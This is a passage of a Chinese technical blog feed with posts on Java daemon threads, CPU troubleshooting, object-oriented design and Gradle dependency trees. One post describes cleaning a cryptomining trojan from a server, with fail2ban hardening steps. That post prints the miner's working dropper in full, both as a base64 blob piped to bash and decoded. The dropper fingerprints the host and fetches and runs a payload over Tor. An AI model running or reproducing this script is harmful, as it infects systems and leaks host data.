class-name">DaemonThread</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>      Thread01 t1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread01</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//注释这一行查看效果</span>      t1<span class="token punctuation">.</span><span class="token function">setDaemon</span><span class="token punctuation">(</span>Boolean<span class="token punctuation">.</span>TRUE<span class="token punctuation">)</span><span class="token punctuation">;</span>      t1<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">try</span> <span class="token punctuation">{</span>          Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>TimeUnit<span class="token punctuation">.</span>SECONDS<span class="token punctuation">.</span><span class="token function">toMillis</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>          e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"main thread end;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Thread01</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>      <span class="token annotation punctuation">@Override</span>      <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>n<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">try</span> <span class="token punctuation">{</span>                  <span class="token function">sleep</span><span class="token punctuation">(</span>TimeUnit<span class="token punctuation">.</span>SECONDS<span class="token punctuation">.</span><span class="token function">toMillis</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                  e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">}</span>          <span class="token punctuation">}</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>}</p><pre><code>``` java/** * 守护线程和守护线程的finally * 守护线程和主线程同死。因此有可能导致finally语句块不能够执行 * * @author lwy * @date 2019/7/4 */public class DeamonThread {    private static class UseThread extends Thread {        @Override        public void run() {            try {                while (!isInterrupted()) {                    System.out.println(Thread.currentThread().getName() + &quot;  i am a thread&quot;);                }                System.out.println(Thread.currentThread().getName() + &quot;  interrupt flag is &quot; + isInterrupted());            } finally {                System.out.println(&quot;thread finally&quot;);            }        }    }    public static void main(String[] args) throws InterruptedException {        UseThread u = new UseThread();        u.setDaemon(true);        u.start();        Thread.sleep(5);//        u.interrupt();    }}</code></pre><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><ol><li>run()和start()方法的区别<br>run方法就是普通对象的普通方法，调用它只是在执行普通的方法，不会产生新的线程。只有调用了start()后，Java才会将线程对象和操作系统中实际的线程进行映射，再来执行run方法。</li></ol><p>​    </p><p>​<br>​<br>​    </p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录一次木马进程导致CPU 700%处理经过</title>
      <link href="/2020/11/13/trojan-process-cpu-100/"/>
      <url>/2020/11/13/trojan-process-cpu-100/</url>
      
        <content type="html"><![CDATA[<h2 id="事件描述"><a href="#事件描述" class="headerlink" title="事件描述"></a>事件描述</h2><p>登陆到测试服务器，发现CPU使用率飙到了700%，可能是机器被攻击。看进程名称，是一个异常进程在搞怪。<br><img src="F4C55F2F-BAE1-43E7-9444-98B7B0F1783D.png" alt></p><h2 id="处理过程"><a href="#处理过程" class="headerlink" title="处理过程"></a>处理过程</h2><ol><li>为了让机器尽快恢复，用<code>kill -9 18616</code>杀掉了这个进程。<br>没想到一会儿进程又出现了，CPU继续飙升。猜测应该是有定时任务在运行</li><li>执行<code>crontab -l</code> 发现果然有一条定时任务。<br><code>57 * * * * /root/.systemd-service.sh &gt; /dev/null 2&gt;&amp;1 &amp;</code><br><img src="1B372739-4214-4D44-A1F4-346BBF8C45E0.png" alt></li><li>此时执行<code>crontab -e</code> 删除掉定时任务。过了一会流氓进程又死灰复燃。应该是还有其他定时任务，或者主进程没有清理</li><li>定位到脚本<br>定位到定时任务脚本(仅供学习)：<pre class="line-numbers language-shell"><code class="language-shell">#!/bin/bash#exec &>/dev/nullecho GmqsLAjf/AU0zNSys0cvX3jvDVQ+RgnpxMER8UQt5sWoBaWlXHA7Zevn9+vXesLeecho R21xc0xBamYvQVUwek5TeXMwY3ZYM2p2RFZRK1JnbnB4TUVSOFVRdDVzV29CYVdsWEhBN1pldm45K3ZYZXNMZQpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ5cnh4eHFpYTQ1eHhjZHFmd3l4NHBrNnVmeWFuYXpkd2pidjNkZTdyNG1ydHl6dHQ1bXB3MzV5ZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgZG5zLmRucy1vdmVyLWh0dHBzLmNvbSB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2guY2VudHJhbGV1LnBpLWRucy5jb20gZG9oLmRucy5zYiBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyBkbnMuZmxhdHVzbGlmaXIuaXMgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTEzKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8c29ydCAtdVJ8aGVhZCAtMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gLiAkSE9NRSAvdXNyL2JpbiAkZCAvdG1wIC92YXIvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmZXhlCmY9L2ludC4kKHVuYW1lIC1tKQp4PS4vJChkYXRlfG1kNXN1bXxjdXQgLWYxIC1kLSkKcj0kKGN1cmwgLTRmc1NMayBjaGVja2lwLmFtYXpvbmF3cy5jb218fGN1cmwgLTRmc1NMayBpcC5zYilfJCh3aG9hbWkpXyQodW5hbWUgLW0pXyQodW5hbWUgLW4pXyQoaXAgYXxncmVwICdpbmV0ICd8YXdrIHsncHJpbnQgJDInfXxtZDVzdW18YXdrIHsncHJpbnQgJDEnfSlfJChjcm9udGFiIC1sfGJhc2U2NCAtdzApCiRjIC14IHNvY2tzNWg6Ly8kczo5MDUwICR0Lm9uaW9uJGYgLW8keCAtZSRyIHx8ICRjICQxJGYgLW8keCAtZSRyCmNobW9kICt4ICR4OyR4O3JtIC1mICR4Cn0KCmZvciBoIGluIHRvcjJ3ZWIuaW4gdG9yMndlYi5pdCBvbmlvbi5mb3VuZGF0aW9uIHRvcjJ3ZWIuc3Ugb25pb24uY29tLmRlIG9uaW9uLnNoIHRvcjJ3ZWIuaW8KZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLTEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1czsgdGhlbgp1ICR0LiRoCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>发现shell内容用base64编码过了。用base64进行解码，发现是挖矿脚本。<pre class="line-numbers language-shell"><code class="language-shell">exec &>/dev/nullexport PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbind=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)c=$(echo "curl -4fsSLkA- -m200")t=$(echo "yrxxxqia45xxcdqfwyx4pk6ufyanazdwjbv3de7r4mrtyztt5mpw35yd")sockz() {n=(doh.defaultroutes.de dns.hostux.net dns.dns-over-https.com uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch)p=$(echo "dns-query?name=relay.tor2socks.in")s=$($c https://${n[$((RANDOM%13))]}/$p | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" |tr ' ' '\n'|sort -uR|head -1)}fexe() {for i in . $HOME /usr/bin $d /tmp /var/tmp ;do echo exit > $i/i && chmod +x $i/i && cd $i && ./i && rm -f i && break;done}u() {sockzfexef=/int.$(uname -m)x=./$(date|md5sum|cut -f1 -d-)r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep 'inet '|awk {'print $2'}|md5sum|awk {'print $1'})_$(crontab -l|base64 -w0)$c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$rchmod +x $x;$x;rm -f $x}for h in tor2web.in tor2web.it onion.foundation tor2web.su onion.com.de onion.sh tor2web.iodoif ! ls /proc/$(head -1 /tmp/.X11-unix/01)/status; thenu $t.$helsebreakfidone<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>用<code>lsof -c 进程名</code>查看该进程的系统调用信息。发现相应控制客户端已经删除使用。<br><img src="22B9B55F-B9BB-4FB9-BA4A-79C2D88689A5.png" alt></li><li><code>pstree</code> 可以看到两个异常进程。用<code>ps -ef</code>获取异常进程信息。一个应该是主进程，一个应该是控制进程。</li><li><code>kill -9 两个木马进程ID</code>删除掉进程。过了一会又启动，推测是有定时任务没清理干净。使用命令<code>ls /etc/cron.d</code>查看到里面还有一个0开头的文件存放着定时任务。<br>删除，然后删掉两个木马进程。删掉垃圾脚本</li><li>系统恢复了短暂的宁静又出现了。查看登陆日志<code>tail -F -n 1000 /var/log/auth.log | grep &#39;failed&#39;</code> ,内网主机在ssh攻击破解。<br>解决办法：<br>修改密码<br>安装fail2ban安全工具<pre class="line-numbers language-shell"><code class="language-shell">sudo apt-get upgradesudo apt-get install -y fail2bansudo systemctl start fail2bansudo nano /etc/fail2ban/jail.local#jail.local 文件内添加[sshd]enabled = trueport = 22filter = sshdlogpath = /var/log/auth.logmaxretry = 3sudo systemctl restart fail2ban<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="005A7DC9-BDD5-4059-A459-90643A3E91C2.png" alt></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>服务器安全问题不容忽视，设置强密码，并控制防火墙，修改ssh默认端口号。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.base64decode.org/" target="_blank" rel="noopener">base64编解码工具</a><br><a href="https://cloud.tencent.com/developer/article/1591665" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1591665【类似病毒】</a><br><a href="https://www.freebuf.com/articles/system/208804.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/208804.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java进程导致CPU使用达到了100%，如何排查，定位，解决该问题？</title>
      <link href="/2020/11/13/java-process-cpu-100/"/>
      <url>/2020/11/13/java-process-cpu-100/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>开发生产中，有时候我们会碰到告警，CPU过高，超过100%，这个时候我们应该怎么办？</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="java进程导致CPU过高"><a href="#java进程导致CPU过高" class="headerlink" title="java进程导致CPU过高"></a>java进程导致CPU过高</h3><h4 id="定位耗费CPU的进程"><a href="#定位耗费CPU的进程" class="headerlink" title="定位耗费CPU的进程"></a>定位耗费CPU的进程</h4><p><code>top -c</code>命令,显示进程列表。然后输入P(大写),按照CPU排序。<br><img src="49D3D198-C786-4A88-AE17-30EAF6CFE578.png" alt><br>如果是Java进程引起的CPU偏高，然后分析为什么这个Java进程对应的线程。进而找到原因。</p><h4 id="定位耗费CPU的线程"><a href="#定位耗费CPU的线程" class="headerlink" title="定位耗费CPU的线程"></a>定位耗费CPU的线程</h4><p><code>top -Hp 进程ID</code>，输入P按照CPU排序。<br><img src="589EC661-44B6-492A-B1B2-6AE71BB007E2.png" alt></p><h4 id="定位哪段代码导致CPU过高"><a href="#定位哪段代码导致CPU过高" class="headerlink" title="定位哪段代码导致CPU过高"></a>定位哪段代码导致CPU过高</h4><p><code>printf &quot;%x\n&quot; 线程ID</code> 把线程pid转换为16进制。<br><img src="DD7F696C-FBEB-4925-BD84-FD6FB267022F.png" alt><br>然后用jstack命令打印进程的堆栈信息，通过grep那个线程的16进制pid，找到那个线程相关的东西。在打印的对战信息中，查找是哪个类的哪个方法导致的CPU 100%的问题。然后去解决问题。<br><code>jstack 进程ID ｜ grep &#39;0x16进制线程ID&#39; -C5 --color</code><br><img src="810E40C9-706F-4950-9D3F-49BC088E012B.png" alt><br>最后得知是代码中存在死循环导致的（测试使用，要是想让CPU跑的更满，可以启用自己CPU一致的线程数，分别死循环）：<br><img src="230B3B03-8067-4628-BBF0-4FEACADFCF27.png" alt></p><p>修改代码，解决问题。</p><p>注意：<br>在编写代码时候，注意循环条件推出方式</p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面向对象的理解</title>
      <link href="/2020/08/12/object-oritened-feature/"/>
      <url>/2020/08/12/object-oritened-feature/</url>
      
        <content type="html"><![CDATA[<h1 id="面向对象的理解"><a href="#面向对象的理解" class="headerlink" title="面向对象的理解"></a>面向对象的理解</h1><p>面向对象是一种编程风格，可以实现很多复杂的设计思路，是设计原则和设计模式编码实现的基础。</p><h2 id="抽象"><a href="#抽象" class="headerlink" title="抽象"></a>抽象</h2><p>抽象是一个很宽泛的名词，从大方面上讲，我们需要以面向对象的方式先抽象出业务对象，然后抽象出其属性和行为，最后进行封装。小的方面就是具体函数方法实现的抽象，他体现在接口类和抽象类上，调用者不需要理解具体实现，只需要知道自己调用的方法目的是什么即可。</p><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>封装主要功能是信息隐藏和数据访问控制。<br>java是面向的对象的语言。项目是对功能代码的封装，包是对类的封装，类是对对象数据属性或行为的封装，变量是对属性的封装，函数是对行为的封装，通过不同的控制访问修饰符，去规范变量和行为的使用范围。<br>在使用方法或一些开源项目适合，不需要知道具体的实现方法，只要知道他实现了什么功能就可以了，简化了我们的工作<br>具体的封装需要对设计模式和设计原则有一定的认识，合理的使用抽象类，接口，类，并组织他们之间的关系有助于提高代码的可扩展性。</p><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>在对对象进行封装的同时，也要对其进行组织，合理的组织能提高代码的可复用性和可扩展性，而继承就是这样一个工具。将共性抽取出去形成父类，差异形成子类。更好的组织代码。<br>此处需要注意一个原则，里氏替换原则。当一个子类调用一个方法时，换成父类，程序逻辑不变。这是为了降低复杂度。<br>当继承是为了代码复用的时候，那么就不要覆盖父类的方法，子类只能通过自增方法实现功能。<br>当继承是为了实现多态的时候，父类最好是是抽象类和接口，通过实现父类的方法进行实现。<br>继承太多会使类结构复杂，可读性和维护性降低，代码复用也可以使用组合来实现。多用组合，少用继承。</p><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>子类可以替换父类，在实际代码运行过程中，调用字类的方法实现。<br>多态简单的说分为静态多态和动态多态，静态多态是方法的重载，动态多态是方法的重写。一句话概括就是，相同的引用调用相同的方法实现不同的功能，这是因为子类的各自的实现原因。它主要是为应对变化而生。可提高代码的可维护性，可扩展性。</p>]]></content>
      
      
      <categories>
          
          <category> 编程方法论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面向对象 </tag>
            
            <tag> 编程方法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gradle 如何定位和解决依赖冲突</title>
      <link href="/2020/07/21/gradle-jar-conclict/"/>
      <url>/2020/07/21/gradle-jar-conclict/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>在开发过程中，我们不仅要引入我们其他项目的jar包，同时随着业务的复杂度加深，也免不了要引入许多的第三方开源库，那么不可避免的会出现依赖冲突的错误。</p><h2 id="如何定位依赖冲突"><a href="#如何定位依赖冲突" class="headerlink" title="如何定位依赖冲突"></a>如何定位依赖冲突</h2><h3 id="排除法"><a href="#排除法" class="headerlink" title="排除法"></a>排除法</h3><p>排除法很简单，但是很耗时，就是选择一个依赖一个依赖的注释、编译、看结果。</p><h3 id="IDEA-gradle可视化"><a href="#IDEA-gradle可视化" class="headerlink" title="IDEA gradle可视化"></a>IDEA gradle可视化</h3><p>idea给我们提供了一个依赖树，但树只是一个平面图，并不是十分的直观。<br><img src="5C266554-7D51-4A1F-9F22-11F05CF908F7.png" alt></p><h3 id="Gradle-Task"><a href="#Gradle-Task" class="headerlink" title="Gradle Task"></a>Gradle Task</h3><p>Gradle提供了一个task：dependencies，这个task能在命令行中显示依赖树之间的依赖关系。双击执行后就能在命令行中打印相关的依赖信息了.可以看到不同的buildType的信息<br><img src="A158B8C5-DE3C-4375-B120-380F66118503.png" alt><br>除了UI点击之外，也可通过命令行的方式来获取依赖树。</p><pre class="line-numbers language-gradle"><code class="language-gradle"># implementation 指定的buildType信息./gradlew app:dependencies -q --configuration implementation<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里我提取一点：</p><pre class="line-numbers language-shell"><code class="language-shell">annotationProcessor - Annotation processors and their dependencies for source set 'main'.\--- org.projectlombok:lombok:1.18.4apiElements - API elements for main. (n)No dependenciesarchives - Configuration for archive artifacts.No dependenciesasciidoctor+--- org.springframework.restdocs:spring-restdocs-asciidoctor -> 2.0.2.RELEASE+--- org.asciidoctor:asciidoctorj:1.5.3.2|    +--- org.jruby:jruby-complete:1.7.21|    \--- com.beust:jcommander:1.35\--- org.asciidoctor:asciidoctorj-groovy-dsl:1.0.0.preview2     +--- org.codehaus.groovy:groovy-all:1.8.9     \--- org.asciidoctor:asciidoctorj:1.5.1 -> 1.5.3.2 (*)bootArchives - Configuration for Spring Boot archive artifacts.No dependenciesimplementation - Implementation only dependencies for source set 'main'. (n)+--- project mbg-model (n)+--- project mbg-mapper (n)+--- project cmp-client (n)compileOnly - Compile only dependencies for source set 'main'.+--- org.springframework.boot:spring-boot-configuration-processor -> 2.1.1.RELEASE\--- org.projectlombok:lombok:1.18.4default - Configuration for default artifacts.+--- com.github.xiaoymin:knife4j-spring-ui:2.0.1+--- org.jsoup:jsoup:1.13.1+--- io.springside:springside-utils:5.0.0-RC1|    +--- com.google.guava:guava:20.0 -> 23.0|    |    +--- com.google.code.findbugs:jsr305:1.3.9 -> 3.0.1|    |    +--- com.google.errorprone:error_prone_annotations:2.0.18|    |    +--- com.google.j2objc:j2objc-annotations:1.1|    |    \--- org.codehaus.mojo:animal-sniffer-annotations:1.14|    +--- org.apache.commons:commons-lang3:3.5 -> 3.8.1|    \--- org.slf4j:slf4j-api:1.7.22 -> 1.7.25compile - Dependencies for source set 'main' (deprecated, use 'implementation' instead).+--- com.github.xiaoymin:knife4j-spring-ui:2.0.1+--- org.jsoup:jsoup:1.13.1\--- io.springside:springside-utils:5.0.0-RC1     +--- com.google.guava:guava:20.0     +--- org.apache.commons:commons-lang3:3.5 -> 3.8.1     \--- org.slf4j:slf4j-api:1.7.22 -> 1.7.25compileClasspath - Compile classpath for source set 'main'.+--- com.github.xiaoymin:knife4j-spring-ui:2.0.1+--- org.jsoup:jsoup:1.13.1+--- io.springside:springside-utils:5.0.0-RC1|    +--- com.google.guava:guava:20.0 -> 23.0|    |    +--- com.google.code.findbugs:jsr305:1.3.9 -> 2.0.1|    |    +--- com.google.errorprone:error_prone_annotations:2.0.18|    |    +--- com.google.j2objc:j2objc-annotations:1.1|    |    \--- org.codehaus.mojo:animal-sniffer-annotations:1.14|    +--- org.apache.commons:commons-lang3:3.5 -> 3.8.1|    \--- org.slf4j:slf4j-api:1.7.22 -> 1.7.25+--- org.springframework.boot:spring-boot-configuration-processor -> 2.1.1.RELEASE+--- org.projectlombok:lombok:1.18.4runtimeElements - Elements of runtime for main. (n)No dependenciesruntimeOnly - Runtime only dependencies for source set 'main'. (n)No dependenciestestAnnotationProcessor - Annotation processors and their dependencies for source set 'test'.\--- org.projectlombok:lombok:1.18.4testCompile - Dependencies for source set 'test' (deprecated, use 'testImplementation' instead).+--- com.github.xiaoymin:knife4j-spring-ui:2.0.1+--- org.jsoup:jsoup:1.13.1\--- io.springside:springside-utils:5.0.0-RC1     +--- com.google.guava:guava:20.0     +--- org.apache.commons:commons-lang3:3.5 -> 3.8.1     \--- org.slf4j:slf4j-api:1.7.22 -> 1.7.25testCompileClasspath - Compile classpath for source set 'test'.+--- com.github.xiaoymin:knife4j-spring-ui:2.0.1+--- org.jsoup:jsoup:1.13.1+--- io.springside:springside-utils:5.0.0-RC1|    +--- com.google.guava:guava:20.0 -> 23.0|    |    +--- com.google.code.findbugs:jsr305:1.3.9 -> 2.0.1|    |    +--- com.google.errorprone:error_prone_annotations:2.0.18|    |    +--- com.google.j2objc:j2objc-annotations:1.1|    |    \--- org.codehaus.mojo:animal-sniffer-annotations:1.14|    +--- org.apache.commons:commons-lang3:3.5 -> 3.8.1|    \--- org.slf4j:slf4j-api:1.7.22 -> 1.7.25testCompileOnly - Compile only dependencies for source set 'test'.\--- org.projectlombok:lombok:1.18.4testImplementation - Implementation only dependencies for source set 'test'. (n)+--- org.springframework.boot:spring-boot-starter-test (n)+--- org.mybatis.spring.boot:mybatis-spring-boot-starter-test:1.3.2 (n)\--- org.springframework.restdocs:spring-restdocs-mockmvc (n)testRuntime - Runtime dependencies for source set 'test' (deprecated, use 'testRuntimeOnly' instead).+--- com.github.xiaoymin:knife4j-spring-ui:2.0.1+--- org.jsoup:jsoup:1.13.1\--- io.springside:springside-utils:5.0.0-RC1     +--- com.google.guava:guava:20.0     +--- org.apache.commons:commons-lang3:3.5 -> 3.8.1     \--- org.slf4j:slf4j-api:1.7.22 -> 1.7.25testRuntimeClasspath - Runtime classpath of source set 'test'.+--- com.github.xiaoymin:knife4j-spring-ui:2.0.1+--- cn.ucloud.ufile:ufile-client-java:2.3.0 (*)+--- io.kubernetes:client-java:5.0.0 (*)+--- org.glassfish.jersey.core:jersey-client:2.11 (*)+--- org.glassfish.jersey.media:jersey-media-json-jackson:2.11 (*)+--- org.glassfish.jersey.core:jersey-common:2.11 (*)+--- org.apache.commons:commons-lang3:3.8.1+--- com.github.penggle:kaptcha:2.3.2|    +--- javax.servlet:javax.servlet-api:3.1.0 -> 4.0.1|    \--- com.jhlabs:filters:2.0.235-1+--- com.google.guava:guava:23.0 (*)+--- com.alibaba:fastjson:1.2.54+--- com.alibaba:druid-spring-boot-starter:1.1.10|    +--- com.alibaba:druid:1.1.10|    +--- org.slf4j:slf4j-api:1.7.25|    \--- org.springframework.boot:spring-boot-autoconfigure:1.5.12.RELEASE -> 2.1.1.RELEASE (*)+--- io.projectreactor:reactor-core:3.2.8.RELEASE|    \--- org.reactivestreams:reactive-streams:1.0.2+--- org.apache.poi:poi-ooxml:3.17|    +--- org.apache.poi:poi:3.17|    |    +--- commons-codec:commons-codec:1.10 -> 1.11|    |    \--- org.apache.commons:commons-collections4:4.1|    +--- org.apache.poi:poi-ooxml-schemas:3.17|    |    \--- org.apache.xmlbeans:xmlbeans:2.6.0|    |         \--- stax:stax-api:1.0.1|    \--- com.github.virtuald:curvesapi:1.04+--- com.squareup.okhttp3:okhttp:3.14.7 (*)+--- mysql:mysql-connector-java:6.0.6+--- org.mybatis.spring.boot:mybatis-spring-boot-starter:1.3.2 (*)+--- com.qcloud:cos_api:5.6.0 (*)+--- com.github.pagehelper:pagehelper-spring-boot-starter:1.2.10 (*)+--- tk.mybatis:mapper-spring-boot-starter:2.1.5|    +--- org.springframework.boot:spring-boot-starter:2.1.1.RELEASE (*)|    +--- org.springframework.boot:spring-boot-starter-jdbc:2.1.1.RELEASE (*)|    +--- org.mybatis:mybatis:3.4.6|    +--- org.mybatis:mybatis-spring:1.3.2|    +--- tk.mybatis:mapper-core:1.1.5|    |    \--- javax.persistence:persistence-api:1.0|    +--- tk.mybatis:mapper-base:1.1.5|    |    \--- javax.persistence:persistence-api:1.0|    +--- tk.mybatis:mapper-weekend:1.1.5|    +--- tk.mybatis:mapper-spring:1.1.5|    +--- tk.mybatis:mapper-extra:1.1.5|    +--- tk.mybatis:mapper-spring-boot-autoconfigure:2.1.5|    |    +--- org.springframework.boot:spring-boot-autoconfigure:2.1.1.RELEASE (*)|    |    +--- junit:junit:4.12 (*)|    |    \--- org.hsqldb:hsqldb:2.4.1|    +--- junit:junit:4.12 (*)|    \--- org.hsqldb:hsqldb:2.4.1+--- org.springframework.boot:spring-boot-devtools -> 2.1.1.RELEASE|    +--- org.springframework.boot:spring-boot:2.1.1.RELEASE (*)|    \--- org.springframework.boot:spring-boot-autoconfigure:2.1.1.RELEASE (*)+--- org.springframework.boot:spring-boot-starter-web -> 2.1.1.RELEASE|    +--- org.springframework.boot:spring-boot-starter:2.1.1.RELEASE (*)|    +--- org.springframework.boot:spring-boot-starter-json:2.1.1.RELEASE|    |    +--- org.springframework.boot:spring-boot-starter:2.1.1.RELEASE (*)|    |    +--- org.springframework:spring-web:5.1.3.RELEASE (*)|    |    +--- com.fasterxml.jackson.core:jackson-databind:2.9.7 (*)|    |    +--- com.fasterxml.jackson.datatype:jackson-datatype-jdk8:2.9.7|    |    |    +--- com.fasterxml.jackson.core:jackson-core:2.9.7|    |    |    \--- com.fasterxml.jackson.core:jackson-databind:2.9.7 (*)|    |    +--- com.fasterxml.jackson.datatype:jackson-datatype-jsr310:2.9.7|    |    |    +--- com.fasterxml.jackson.core:jackson-annotations:2.9.0|    |    |    +--- com.fasterxml.jackson.core:jackson-core:2.9.7|    |    |    \--- com.fasterxml.jackson.core:jackson-databind:2.9.7 (*)|    |    \--- com.fasterxml.jackson.module:jackson-module-parameter-names:2.9.7|    |         +--- com.fasterxml.jackson.core:jackson-core:2.9.7|    |         \--- com.fasterxml.jackson.core:jackson-databind:2.9.7 (*)|    +--- org.springframework.boot:spring-boot-starter-tomcat:2.1.1.RELEASE|    |    +--- javax.annotation:javax.annotation-api:1.3.2|    |    +--- org.apache.tomcat.embed:tomcat-embed-core:9.0.13|    |    +--- org.apache.tomcat.embed:tomcat-embed-el:9.0.13|    |    \--- 